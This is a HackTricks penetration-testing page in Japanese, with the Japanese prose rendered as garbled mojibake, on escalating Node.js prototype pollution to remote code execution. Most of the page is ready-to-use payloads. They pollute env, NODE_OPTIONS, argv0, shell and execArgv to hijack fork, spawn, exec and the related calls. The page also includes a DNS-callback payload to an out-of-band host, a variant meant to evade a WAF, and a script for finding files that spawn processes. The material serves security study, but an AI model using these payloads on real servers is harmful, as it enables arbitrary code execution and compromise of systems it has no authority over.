# Prototype Pollutionã‹ã‚‰RCEã¸

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## è„†å¼±ãªã‚³ãƒ¼ãƒ‰

æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å®Ÿéš›ã®JSã‚’æƒ³åƒã—ã¦ãã ã•ã„ï¼š
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## ç’°å¢ƒå¤‰æ•°ã‚’ä»‹ã—ãŸPP2RCE

**PP2RCE**ã¯ã€**Prototype Pollution to RCE** (Remote Code Execution)ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã“ã®[**writeup**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)ã«ã‚ˆã‚‹ã¨ã€**`child_process`**ï¼ˆ`fork`ã‚„`spawn`ãªã©ï¼‰ã®ã„ãã¤ã‹ã®ãƒ¡ã‚½ãƒƒãƒ‰ã§**ãƒ—ãƒ­ã‚»ã‚¹ãŒç”Ÿæˆã•ã‚Œã‚‹**ã¨ã€æ–°ã—ã„ç’°å¢ƒå¤‰æ•°ã‚’ä½œæˆã™ã‚‹**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ã§ã‚ã‚‹`normalizeSpawnArguments`ãƒ¡ã‚½ãƒƒãƒ‰ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã™ã‚‹ã¨ã€**å±æ€§ `.env` ã‚’æ±šæŸ“ã™ã‚‹ã“ã¨ã§ `envPairs`** ã‚’**æ¯’ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

### **`__proto__` ã®æ¯’åŒ–**

{% hint style="warning" %}
nodeã®**`child_process`** ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã® **`normalizeSpawnArguments`** é–¢æ•°ã®å‹•ä½œã«ã‚ˆã‚Šã€ãƒ—ãƒ­ã‚»ã‚¹ã«æ–°ã—ã„ç’°å¢ƒå¤‰æ•°ã‚’**è¨­å®šã™ã‚‹ãŸã‚ã«ã¯**ã€ä½•ã‹ã‚’**æ±šæŸ“ã™ã‚‹**ã ã‘ã§è‰¯ã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
ä¾‹ãˆã°ã€`__proto__.avar="valuevar"` ã¨ã™ã‚‹ã¨ã€`avar` ã¨ã„ã†åå‰ã®å¤‰æ•°ãŒ `valuevar` ã®å€¤ã§ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚¹ãƒãƒ¼ãƒ³ã•ã‚Œã¾ã™ã€‚

ã—ã‹ã—ã€ç’°å¢ƒå¤‰æ•°ãŒ**æœ€åˆã®ã‚‚ã®ã§ã‚ã‚‹ãŸã‚ã«ã¯**ã€**`.env` å±æ€§ã‚’æ±šæŸ“ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆãã—ã¦ã€ã„ãã¤ã‹ã®æ–¹æ³•ã§ã¯ï¼‰ã€ãã®å¤‰æ•°ãŒ**æœ€åˆã®ã‚‚ã®ã«ãªã‚Šã¾ã™**ï¼ˆæ”»æ’ƒã‚’å¯èƒ½ã«ã—ã¾ã™ï¼‰ã€‚

ãã®ãŸã‚ã€ä»¥ä¸‹ã®æ”»æ’ƒã§ã¯ **`NODE_OPTIONS`** ãŒ **`.env` å†…ã«ã¯ã‚ã‚Šã¾ã›ã‚“**ã€‚
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### `constructor.prototype`ã®æ±šæŸ“
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## ç’°å¢ƒå¤‰æ•° + ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚’ä»‹ã—ãŸPP2RCE

å‰è¿°ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã„ãã¤ã‹ã®å¤‰æ›´ã‚’åŠ ãˆãŸé¡ä¼¼ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ[**ã“ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ã§ææ¡ˆã•ã‚Œã¾ã—ãŸã€‚ä¸»ãªé•ã„ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:

* ãƒ•ã‚¡ã‚¤ãƒ«`/proc/self/environ`ã«Node.jsã®**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’ä¿å­˜ã™ã‚‹ä»£ã‚ã‚Šã«ã€**`/proc/self/cmdline`**ã®**argv0**ã«ä¿å­˜ã—ã¾ã™ã€‚
* ãã—ã¦ã€`NODE_OPTIONS`ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«`/proc/self/environ`ã‚’è¦æ±‚ã™ã‚‹ä»£ã‚ã‚Šã«ã€**`/proc/self/cmdline`**ã‚’**è¦æ±‚ã—ã¾ã™**ã€‚

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## DNS ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³

ä»¥ä¸‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ä»¥å‰ã«è­°è«–ã—ãŸ NODE\_OPTIONS ç’°å¢ƒå¤‰æ•°ã‚’æ‚ªç”¨ã—ã€DNS ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ã§ãã‚ŒãŒæ©Ÿèƒ½ã—ãŸã‹ã©ã†ã‹ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
ã¾ãŸã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’æ±‚ã‚ã‚‹WAFã‚’é¿ã‘ã‚‹ãŸã‚ã«ï¼š
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## PP2RCE è„†å¼±æ€§ child_process é–¢æ•°

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**`child_process` ã®å„é–¢æ•°ã‚’åˆ†æã—ã¦**ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’è©¦ã¿ã€ãã®é–¢æ•°ã‚’å¼·åˆ¶çš„ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã•ã›ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒä½¿ãˆã‚‹ã‹ã©ã†ã‹ã‚’è¦‹ã¦ã„ãã¾ã™ï¼š

<details>

<summary><code>exec</code> ã®æ‚ªç”¨</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> ã®æ‚ªç”¨</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
**`execFile`** ãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€NODE\_OPTIONSãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«**å¿…ãšnodeã‚’å®Ÿè¡Œ**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
ã‚‚ã—**nodeã‚’å®Ÿè¡Œã—ã¦ã„ãªã„**å ´åˆã¯ã€å®Ÿè¡Œã—ã¦ã„ã‚‹ã‚‚ã®ã‚’**ç’°å¢ƒå¤‰æ•°**ã§ã©ã®ã‚ˆã†ã«**å®Ÿè¡Œå¤‰æ›´**ã§ãã‚‹ã‹ã‚’è¦‹ã¤ã‘ã€ãã‚Œã‚‰ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

**ä»–ã®**æŠ€è¡“ã¯ã“ã®è¦ä»¶ãªã—ã§**æ©Ÿèƒ½ã—ã¾ã™**ã€‚ãªãœãªã‚‰ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’é€šã˜ã¦**å®Ÿè¡Œã•ã‚Œã‚‹ã‚‚ã®ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã ã‹ã‚‰ã§ã™ã€‚ï¼ˆã“ã®å ´åˆã€`.shell`ã‚’æ±šæŸ“ã§ããŸã¨ã—ã¦ã‚‚ã€å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚‚ã®ã¯æ±šæŸ“ã•ã‚Œã¾ã›ã‚“ï¼‰ã€‚

</details>

<details>

<summary><code>fork</code> ã®æ‚ªç”¨</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawn</code> ã®æ‚ªç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code>ã®æ‚ªç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> ã®æ‚ªç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> ã®æ‚ªç”¨</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## ã‚¹ãƒãƒ¼ãƒ³ã‚’å¼·åˆ¶ã™ã‚‹

å‰ã®ä¾‹ã§ã¯ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãŸã‚ã«ã¯ã€**`spawn` ã‚’å‘¼ã³å‡ºã™**æ©Ÿèƒ½ãŒ**å­˜åœ¨ã™ã‚‹**å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚’è¦‹ã¾ã—ãŸï¼ˆä½•ã‹ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ **`child_process`** ã®ã™ã¹ã¦ã®ãƒ¡ã‚½ãƒƒãƒ‰ãŒãã‚Œã‚’å‘¼ã³å‡ºã—ã¾ã™ï¼‰ã€‚å‰ã®ä¾‹ã§ã¯ã€ãã‚Œã¯**ã‚³ãƒ¼ãƒ‰ã®ä¸€éƒ¨**ã§ã—ãŸãŒã€ã‚³ãƒ¼ãƒ‰ãŒãã‚Œã‚’å‘¼ã³å‡ºã—ã¦**ã„ãªã„**å ´åˆã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚

### require ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®åˆ¶å¾¡

ã“ã®[**ä»–ã®ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå®Ÿè¡Œã•ã‚Œã‚‹ **`require`** ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚ãã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ”»æ’ƒè€…ã¯ã‚·ã‚¹ãƒ†ãƒ å†…ã«ã‚ã‚‹ **`.js` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹**ã ã‘ã§ã‚ˆãã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚ŒãŸã¨ãã«**ã‚¹ãƒãƒ¼ãƒ³ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚**\
ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚ŒãŸã¨ãã«ã‚¹ãƒãƒ¼ãƒ³é–¢æ•°ã‚’å‘¼ã³å‡ºã™ä¸€èˆ¬çš„ãªãƒ•ã‚¡ã‚¤ãƒ«ã®ä¾‹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **ä»¥ä¸‹ã«ã•ã‚‰ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¢ã™**

ä»¥ä¸‹ã®ã‚·ãƒ³ãƒ—ãƒ«ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€é–¢æ•°å†…ã®å‘¼ã³å‡ºã—ã‚’è¡¨ç¤ºã—ãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã€**ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ãªã—ã§** **child\_process** ã‹ã‚‰ã®**å‘¼ã³å‡ºã—**ã‚’æ¤œç´¢ã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
<details>

<summary>ä»¥å‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§è¦‹ã¤ã‹ã£ãŸèˆˆå‘³æ·±ã„ãƒ•ã‚¡ã‚¤ãƒ«</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã‚’åˆ©ç”¨ã—ãŸrequireãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã®è¨­å®š

{% hint style="warning" %}
**å‰ã®æŠ€è¡“ã¯**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**è¦æ±‚ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’**åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒå¿…è¦ã§ã™**ã€‚ã—ã‹ã—ã€ã“ã‚Œã¯å¸¸ã«çœŸå®Ÿã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

